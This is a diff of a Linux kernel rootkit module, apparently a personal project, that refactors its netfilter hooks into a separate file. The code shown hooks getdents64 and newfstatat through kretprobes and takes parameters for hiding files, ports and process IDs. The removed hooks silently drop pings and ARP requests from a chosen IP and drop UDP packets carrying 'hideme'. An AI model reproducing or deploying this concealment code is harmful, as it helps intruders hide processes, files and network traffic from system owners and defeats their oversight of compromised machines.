+++ rootkit/yarin_module_main.c
@@ -14,13 +14,7 @@
 #include <linux/sched/signal.h>
 
 #include <linux/netfilter.h>
-#include <linux/netfilter_arp.h>
-#include <uapi/linux/netfilter_ipv4.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/icmp.h>
 #include <linux/udp.h>
-#include <linux/if_arp.h>
 
 #include "helpers.h"
 #include "step2.h"
@@ -42,7 +36,11 @@ static char* selected_ip_str = NULL;
 module_param(selected_ip_str, charp, S_IRWXU);
 MODULE_PARM_DESC(selected_ip_str, "ip to hide packets from.");
 
-static char selected_ip[4] = {0, 0, 0, 0};
+bool filter_arp = true;
+module_param(filter_arp, bool, S_IRWXU);
+MODULE_PARM_DESC(selected_ip_str, "when true filtering all ARP packets from selected_ip_str.");
+
+char selected_ip[4] = {0, 0, 0, 0};
 
 static char* pid_to_hide_path[256] = {0};
 
@@ -234,120 +232,8 @@ static int newfstatat_handle_return(struct kretprobe_instance *ri, struct pt_reg
 }
 
 
-static unsigned int netfilter_ip_hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
-{
-    // struct ethhdr *eth = eth_hdr(skb);
-    struct iphdr *ip = ip_hdr(skb);
-
-    // printk("caller: %s\n", current->comm);
-    // printk("mac: %pM\n", eth->h_source);
-    // printk("ip protocol: %d\n", ip->protocol);
-    // printk("ip protocol: %d\n", ip->protocol);
-    // printk("%pI4 -> %pI4\n", &ip->saddr, &ip->daddr);
-
-    unsigned long ip_source = ip->saddr;
-    unsigned long my_ip = 0;
-    memcpy(&my_ip, selected_ip, 4);
-
-    switch (ip->protocol)
-    {
-    case IPPROTO_ICMP:
-    {
-        if (ip_source == my_ip)
-        {
-            struct icmphdr *icmp = icmp_hdr(skb);
-
-            // ping
-            if (icmp->type == ICMP_ECHO)
-            {
-                pr_info("Dropping PING %pI4\n", &ip_source);
-                return NF_DROP;
-            }
-        }
-        break;
-    }
-    case IPPROTO_UDP:
-    {
-        struct udphdr *udp = udp_hdr(skb);
-        void *payload = ((char *)udp) + sizeof(struct udphdr);
-
-        char *message = payload;
-        if (memchr(message, '\0', 1024) != NULL)
-        {
-            if (strcmp(message, "hideme") == 0)
-            {
-                pr_info("HIDING UDP message: %s\n", message);
-                return NF_DROP;
-            }
-        }
-        else
-        {
-            pr_info("UDP message is nbt string\n");
-        }
-
-        break;
-    }
-    }
-
-    return NF_ACCEPT;
-}
-
-struct arp_ip_request {
-    unsigned char sender_ha_addr[ETH_ALEN];
-    unsigned char sender_ip_addr[4];
-    
-    unsigned char target_ha_addr[ETH_ALEN];
-    unsigned char target_ip_addr[4];
-};
-
-static unsigned int netfilter_arp_hook_func(void * priv, struct sk_buff * skb, const struct nf_hook_state * state){
-    struct arphdr * arp = arp_hdr(skb);
-    struct arp_ip_request  arp_request;
-    unsigned short op = ntohs(arp->ar_op);
-
-    // only ARP IP request
-    if(op != ARPOP_REQUEST || ntohs(arp->ar_pro) != ETH_P_IP){
-        return NF_ACCEPT;
-    }
-
-    // copy to buffer
-    if(skb_copy_bits(skb, sizeof(struct arphdr), (void*)&arp_request, sizeof(struct arp_ip_request)) < 0){
-        pr_warn("Cannot copy from packet\n");
-        return NF_ACCEPT;
-    }
-
-    // pr_info("ARP from %pI4 Searching %pI4\n", arp_request.sender_ip_addr, arp_request.target_ip_addr);
-
-    unsigned long my_ip = 0;
-    memcpy(&my_ip, selected_ip, 4);
-    unsigned long sender_ip = 0;
-    memcpy(&sender_ip, arp_request.sender_ip_addr, 4);
-
-    if(sender_ip == my_ip){
-        pr_info("DROPING ARP from %pI4 Searching %pI4\n", arp_request.sender_ip_addr, arp_request.target_ip_addr);
-        return NF_DROP;
-    }
-
-    return NF_ACCEPT;
-}
-
-
-
-static const int net_hook_count = 2;
-static struct nf_hook_ops net_hooks[] = {
-    {
-        .hook = netfilter_ip_hook_func,
-        .hooknum = NF_INET_PRE_ROUTING,
-        .pf = NFPROTO_INET,
-        .priority= NF_IP_PRI_FIRST
-    },
-    {
-        .hook = netfilter_arp_hook_func,
-        .hooknum = NF_INET_PRE_ROUTING,
-        .pf = NFPROTO_ARP,
-        .priority= NF_IP_PRI_FIRST
-    }
-};
+extern const int net_hook_count;
+extern struct nf_hook_ops net_hooks[];
 
 
 static struct kretprobe getdents64_kret_probe = {
@@ -401,7 +287,8 @@ static int __init entrypoint(void)
     }
 
 
-    pr_info("yarin_module registered; hide_file_name='%s', hide_port=%d, hide_pid=%d, block_ip=%s\n", hide_file_name, port_to_hide, pid_to_hide_n, selected_ip_str);
+    pr_info("yarin_module registered; hide_file_name='%s', hide_port=%d, hide_pid=%d, block_ip=%s, filter_arp=%d\n",
+            hide_file_name, port_to_hide, pid_to_hide_n, selected_ip_str, filter_arp);
     return 0;
 }
